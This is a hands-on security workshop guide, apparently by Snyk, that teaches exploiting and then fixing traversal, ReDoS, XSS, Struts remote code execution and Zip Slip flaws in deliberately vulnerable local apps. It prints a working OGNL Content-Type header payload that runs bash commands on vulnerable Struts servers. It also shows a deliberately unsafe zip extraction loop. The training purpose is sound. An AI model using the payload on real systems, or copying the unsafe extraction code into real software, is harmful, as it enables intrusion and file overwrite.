# exploit-workshop
In this step by step workshop you'll learn how to exploit various real world vulnerabilities existing in vulnerable versions of packages in a Node.js and Java application.

# Required software you need to install for this workshop

You can do this workshop in 2 different flavours
* Using the prepared [Docker images](install/docker.md)

**OR**

* Install everything on your [local machine](install/manual.md)


# An introduction to this workshop

This workshop will lead you through installing and exploiting a number of intentionally vulnerable applications. The applications will use real world packages with know vulnerabilities, including:

* Directory traversal
* Regular expression denial of service (ReDoS)
* Cross site scripting (XSS)
* Remote code execution (RCE)
* Arbitrary file overwrite (Zip Slip)

These exploits exist in a number of applications, most of which you will need to install either locally or on a cloud instance. The instructions below will walk you through the local installations, but you are more than welcome to try them out on remote cloud instances also.

For each vulnerability section in this workshop, you’ll be given information about the vulnerability as well as the package it exists in. You are encouraged to attempt to hack the application by trial and error without reading any hints at first. Try to think how you can trick the application sanitization and get into the mind of a hacker. The hints are there for when you get stuck so read them in order as and when you need a helping hand. If you can complete the hack without hints, that’s great! However it can be good to read the hints afterwards to make sure you broke in the same way we did! Plus there could be little tips in there to learn from also.

# Goof installation

Depending on your choice before pick the appropriate install manual
* using [Docker Images](install/goof_docker.md)
* install on [Local machine](install/goof_local.md)



From your browser of choice, navigate to [http://localhost:3001](http://localhost:3001) and you should see the following page.

![Goof homepage](images/image12.png)

Take a few minutes playing with the site, and in particular, create a few todo items, using regular text “Buy Milk” as well as using markdown “Buy \*\*lots\*\* of milk”. Also navigate to the very modest about page linked to from the bottom of the homepage. Delight in the CSS-foo used to create this about page. Note: PRs sent that make this page look nicer will not be merged ;o)

![Goof about page](images/image1.png)


## Scan your application

First of all, let's look at it from the blue (defensive) side. 
Fork the goof application to your own github account. The application can be found on GitHub here: [https://github.com/snyk/goof](https://github.com/snyk/goof).
We need to scan our application to understand the direct and indirect dependencies that exist in the application, as well as the vulnerabilities in each library. To do this, navigate to [https://snyk.io](https://snyk.io) and click "Sign up" or "Log in" (if you're already a user), on the top right of the site:


![Login button](images/image13.png)

Click the "Log in with your GitHub" button:

![Google Log in button](images/image14.png)

Next, import the goof project that you just cloned previously. Select ```goof``` from your GitHub repo list and click the "Import Projects" button on the top right of the window.

![GitHub projects](images/image15.png)

When the project has been scanned you'll see it in your dashboard:

![Project Dashboard Goof](images/image16.png)

Click the ```package.json``` link to see the project page, which includes the full list of security vulnerabilities:

![Project vuln page](images/image17.png)

You can click on the issues and dependencies tabs to see more information about the vulnerabilities and their remediation as well as where they are being introduced by your application. You'll notice towards the bottom of the vulnerability listing there is a directory traversal vulnerability in the ```st``` package. Let's look at this in more detail.

![st directory traversal vuln](images/image18.png)

## Directory Traversal
A Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with "dot-dot-slash" (```../```) sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.

*Directory Traversal* vulnerabilities can be generally divided into two types:

* *Information Disclosure* allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.
* *Writing arbitrary files*: Allows the attacker to create or replace existing files. This type of vulnerability is also known as Zip-Slip.

The package in the goof application which contains a directory traversal vulnerability which we will exploit is the [st](http://npmjs.com/package/st) package. Take a look at the st docs and familiarise yourself with the library.

You should now be aware of what directory traversal is, what the st package does and can go ahead and hack the application -- you're back on the red team now! Look around the application for where the st package might be used and try to traverse to a directory you should not be allowed to access.

Here are some hints to give you clues if you get stuck - try your best to only look at them once you’ve had a try yourself already and need help.

Click to see [Hint 1](st/hint1.md).

Click to see [Hint 2](st/hint2.md).

Click to see [Hint 3](st/hint3.md).

Click to see [Hint 4](st/hint4.md).

Click to see [Hint 5](st/hint5.md).

Click to see [Hint 6](st/hint6.md).

Click to see [Hint 7](st/hint7.md).

Click to see [Hint 8](st/hint8.md).

Click to see [Hint 9](st/hint9.md).

Navigate your filesystem as if you were an attacker to find 3 pieces of sensitive information on your machine that you perhaps wouldn’t want an attacker to see.

Click to see [Hint 10](st/hint10.md).

Take a look at the vulnerability description, including the CVSS score: [https://snyk.io/vuln/npm:st:20140206](https://snyk.io/vuln/npm:st:20140206). Why do you think the vulnerability is a medium severity, rather than high?

### Remediate the vulnerability

Back on the snyk project page, find the directory traversal vulnerability in the ```st``` package and look at the remediation advice. You'll see there's only a single path to this vulnerability in the application, and the ```st``` package is a direct dependency, so remediation shouldn't be too tricky. We can see that we need to update the version of the ```st``` package to ```0.2.5```. We can do this automatically, by clicking the "Fix this vulnerability" button.

![Fix this vulnerability](images/image19.png)

You'll see a list of your vulnerabilities, and only the ```st``` vulnerability should be selected. Scroll down to the bottom of the page and click "Open a fix PR":

![Open a fix PR](images/image20.png)

Take a look at the code changes in the pull request under the "Files Changed" tab:

![PR tests](images/image23.png)

Make sure your new PR tests do not introduce any new security or licence issue have passed. These can be found in the conversation tab of the PR:

![PR tests](images/image22.png)

When you're happy with the PR, merge the changes.

#### Local machine install only (This will not work when you are using the Docker images)

If you're running the application locally stop it by hitting ```Ctrl+C``` in the window you ran ```npm start```. Get the latest code from GitHub by running ```git fetch```. Download the new version of ```st``` by running ```npm install``` and then start your application again, using ```npm start```.

Try your hacks again. *Congratulations!*, you’ve remediated the vulnerability and should now be redirected to the homepage each time you try to break free of the public folder.

## Regular expression denial of service (ReDoS)

Take a look at the description of a ReDoS vulnerability in your Snyk scan:

![ReDoS vuln information](images/image21.png)

This vulnerability in the ms package will be the one we will break in the goof application. Use the following command to add a todo item that contains a string representation of time:

```
$ echo 'content=Call mom in 20 minutes' | http --form http://localhost:3001/create -v
```

The ms library has matched a time pattern in your content input string. This is represented slightly differently on the goof webpage.

![Call mom image](images/image8.png)

Using your knowledge of how ReDoS works, try to pass a content string that causes a noticeable delay, or a denial of service for other users. Note that while the request is being processed, the webpage will buffer any of your further requests until your first request is handled.

Click to see [Hint 1](ms/hint1.md).

Click to see [Hint 2](ms/hint2.md).

Click to see [Hint 3](ms/hint3.md).

Click to see [Hint 4](ms/hint4.md).

Click to see [Hint 5](ms/hint5.md).

Think about how might programmatically avoid this attack in your application code?

### Remediate the vulnerability

Back on the snyk project page, find the regular expression denial of service vulnerability in the ```ms``` package and look at the remediation advice. You'll see there's only a single path to this vulnerability in the application, and the ```ms``` package is an indirect dependency, being pulled in by the ```humanize-ms``` package. We can see that we need to update the ```humanize-ms``` version to ```1.0.2```. This will pull in the ```ms``` package at a fixed version. Click "Fix this Vulnerability" again and create a PR.

![Fix this vulnerability](images/image19.png)

After updating your application, try your hacks again. *Congratulations!*, you’ve remediated the vulnerability!

## Cross Site Scripting (XSS)

XSS attacks occur when an attacker tricks a user’s browser to execute malicious JavaScript code in the context of a victim’s domain. Such scripts can steal the user’s session cookies for the domain, scrape or modify its content, and perform or modify actions on the user’s behalf, actions typically blocked by the browser’s Same Origin Policy.
These attacks are possible by escaping the context of the web application and injecting malicious scripts in an otherwise trusted website. These scripts can introduce additional attributes (say, a "new" option in a dropdown list or a new link to a malicious site) and can potentially execute code on the client's side, unbeknown to the victim. This occurs when characters like ```< > " '``` are not escaped properly.

There are a few types of XSS:

* *Persistent XSS* is an attack in which the malicious code persists into the web app’s database.
* *Reflected XSS* is an attack which the website echoes back a portion of the request. The attacker needs to trick the user into clicking a malicious link (for instance through a phishing email or malicious JS on another page), which triggers the XSS attack.
* *DOM-based XSS* is an attack that occurs purely in the browser when client-side JavaScript echoes back a portion of the URL onto the page. DOM-Based XSS is notoriously hard to detect, as the server never gets a chance to see the attack taking place.

The vulnerability exists in the marked library. This library allows us to enter markdown text into the todo input box and have the resultant text display in bold, or whatever your heart desires. Now that you’re more than familiar with this complex, multipage application, keeping in mind the package that is vulnerable.

To start off with, lets try to display the alert ‘1’. Very cliché, right?

Click to see [Hint 1](marked/hint1.md).

Click to see [Hint 2](marked/hint2.md).

Click to see [Hint 3](marked/hint3.md).

Click to see [Hint 4](marked/hint4.md).

Click to see [Hint 5](marked/hint5.md).

Click to see [Hint 6](marked/hint6.md).

Click to see [Hint 7](marked/hint7.md).

Click to see [Hint 8](marked/hint8.md).

Once you have been able to execute some JavaScript that creates an alert, as shown below. You can try something a little trickier to maybe get some sensitive information!

![marked exploit](images/image10.png)

### Remediate the vulnerability

Back on the snyk project page, find the XSS vulnerability in the ```marked``` package and look at the remediation advice. You'll see there's only a single path to this vulnerability in the application, and the ```marked``` package is a direct dependency. We can see that we need to update ```marked``` to version ```0.3.9```. Click "Fix this Vulnerability" again and create a PR.

![Fix this vulnerability](images/image19.png)

After updating your application, try your hacks again. Congratulations, you’ve remediated the XSS vulnerability and shouldn’t be able to embed JavaScript on the web page any longer.

# Java Goof Installation

Depending on your choice before pick the appropriate install manual
* using [Docker Images](install/javagoof_docker.md)
* install on [Local machine](install/javagoof_local.md)


From a browser navigate to the following URL: [http://localhost:8080/](http://localhost:8080/)

You will see this application. It looks better than the Node application. Because Java is better than Node. Fact.

![Java Goof homepage](images/image9.png)

Click “Sign In” and use the following credentials:

```
Username: foo@bar.org
Password: foobar
```

When signed in, you’ll see a number of todo entries. If you click about at the top of the screen, you’ll see that the application uses, Spring, Hibernate and Apache Struts. This is very kind of the application to give us this data! Websites aren’t usually this kind :)

## Scan your application

Back on the blue (defensive) team, now. We need to scan our application to understand the direct and indirect dependencies that exist in the application, as well as the vulnerabilities in each library.
Fork Java Goof to your own github account. The application can be found on GitHub here: [https://github.com/snyk/java-goof](https://github.com/snyk/java-goof) 

If you've already got a Snyk account from earlier in the workshop, you just need to add the Java Goof repository into the Snyk  dashboard. If you haven't done so, create your account as follows:

Navigate to [https://snyk.io](https://snyk.io) if you haven't done so already, click "Log in" or "Sign up" on the top right of the site.

![Login button](images/image13.png)

Click the "Log in with your GitHub" button:

![Google Log in button](images/image14.png)

Import the goof project that you just cloned previously. Click the Integrations link shown below:

![GitHub projects](images/image25.png)

From here, select the GitHub integration and select ```java-goof``` from your GitHub repo list and click the "Add selected repositories" button on the top right of the window.

![GitHub projects](images/image24.png)

When the project has been scanned you'll see it in your dashboard:

![Project Dashboard Goof](images/image26.png)

Click the ```todolist-web-struts/pom.xml``` link to see the full list of security vulnerabilities for that portion of the project:

![Project vuln page](images/image27.png)

## Remote Code Execution

The vulnerability exists in the ```org.apache.struts:struts2-core``` package.

Affected versions of the package are vulnerable to Arbitrary Command Execution while uploading files with the Jakarta Multipart parser. This particular vulnerability can be exploited by an attacker by sending a crafted request to upload a file to the vulnerable server that uses a Jakarta-based plugin to process the upload request.

The attacker can then send malicious code in the ```Content-Type```, ```Content-Disposition``` or ```Content-Length``` HTTP headers, which will then be executed by the vulnerable server. A proof of concept that demonstrates the attack scenario is publicly available and the vulnerability is being actively exploited in the wild.

Although maintainers of the open source project immediately patched the vulnerability, Struts servers that have yet to install the update remain under attack by hackers who exploit it to inject commands of their choice.

This attack can be achieved without authentication. To make matters worse, web applications don't necessarily need to successfully upload a malicious file to exploit this vulnerability, as just the presence of the vulnerable Struts library within an application is enough to exploit the vulnerability.

Here is an example header which can exploit the vulnerability. Notice the content type starts with ```%{```.

```
"Content-type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='COMMAND').(#cmds={'/bin/bash','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
```

You’ll notice a ```ProcessBuilder``` is created and a bash command will be executed as a result.

Hack the application by making an HTTP GET request to the application, sending this header in the request.

Click to see [Hint 1](struts/hint1.md).

Click to see [Hint 2](struts/hint2.md).

You should by now have executed a remote command, like this env command to retrieve the environment variables of your machine:

![Struts vuln exploits](images/image6.png)

At this state you now have execution rights on the machine through curling an URL. Continue to run other commands to see what you can learn about the machine as well as run on the machine.

# Zip Slip

Create a new Maven project in your IDE of choice. I won’t judge you. Add a new dependency in your ```pom.xml``` file.

```xml
    <dependency>
      <groupId>org.zeroturnaround</groupId>
      <artifactId>zt-zip</artifactId>
      <version>1.12</version>
      <type>jar</type>
    </dependency>
```

In this repository, you'll find a [zip-slip.zip](zipslip/zip-slip.zip) archive. Download it and run the following command on the archive to see the output. I expect you’ll know how this hack works once you see the output.

```
$ jar -tvf zip-slip.zip
```

## The Zip Slip Vulnerability

Zip Slip is a form of directory traversal that can be exploited by extracting files from an archive. The premise of the directory traversal vulnerability is that an attacker can gain access to parts of the file system outside of the target folder in which they should reside. The attacker can then overwrite executable files and either invoke them remotely or wait for the system or user to call them, thus achieving remote command execution on the victim’s machine. The vulnerability can also cause damage by overwriting configuration files or other sensitive resources, and can be exploited on both client (user) machines and servers.

The two parts required to exploit this vulnerability is a malicious archive and extraction code that does not perform validation checking. Let’s look through each of these in turn. First of all, the contents of the zip file needs to have one or more files that break out of the target directory when extracted. In the ```zip-slip.zip``` example, we can see two files, a good.txt file which would be extracted into the target directory and an evil.txt file which is trying to traverse up the directory tree to the tmp directory. You’ll notice many levels of ```../``` exist so that the file stands a better chance of reaching the root directory, before trying to traverse to the ```/tmp``` directory from the root directory.

Use the ```zt-zip```’s unpack utility found in ```ZipUtil``` to extract the file and notice where the ```good.txt``` and ```evil.txt``` appear on your filesystem.

Click to see [Hint 1](zipslip/hint1.md).

Click to see [Hint 2](zipslip/hint2.md).

Once you have unzipped the evil.txt file into your tmp directory, take a look at the vulnerability information ([https://snyk.io/vuln/SNYK-JAVA-ORGZEROTURNAROUND-31681](https://snyk.io/vuln/SNYK-JAVA-ORGZEROTURNAROUND-31681)).

### Fix the vulnerability!

Click to see [Hint 3](zipslip/hint3.md).

Click to see [Hint 4](zipslip/hint4.md).

Now that you’re remediated the vulnerability in your ```zt-zip``` dependency, let’s look at the code that can be used to do this in Java. Note we used the Apache Commons IO library in this example to perform our file copy on line 8.

```java
1.    	final String destinationDir = /* <your destination dir> */;
2.    	ZipFile zip = new ZipFile(/* <your zip file> */);
3.    	Enumeration<ZipEntry> entries =  (Enumeration<ZipEntry>) zip.entries();
4.    	while (entries.hasMoreElements()) {
5.    	  ZipEntry e = entries.nextElement();
6.    	  File f = new File(destinationDir, e.getName());
7.    	  InputStream input = zip.getInputStream(e);
8.    	  FileUtils.copyToFile(input, f);
9.  	}
```

Let’s switch out our previous ```ZipUtil.unpack``` invocation with this code. Delete the ```good.txt``` and ```evil.txt``` files from your file system and run the application again. You’ll notice the ```evil.txt``` file once again reaches the ```/tmp``` directory.

Identify which lines of code above are the culprits and fix them!

Click to see [Hint 5](zipslip/hint5.md).

Click to see [Hint 6](zipslip/hint6.md).

Click to see [Hint 7](zipslip/hint7.md).

Click to see [Hint 8](zipslip/hint8.md).

Click to see [Hint 9](zipslip/hint9.md).

Once you’ve defensively coded your solution, check out our final code sample in [Hint 9](zipslip/hint9.md) to see how it compares to your version. Did you include the trailing file separator on line 9? This ensures that the directory doesn’t just start with the directory name we’ve chosen, but is the directory we chose to extract files to.

Thank you for taking this workshop. If you see any typos or suggest additional hints, please send us a PR!
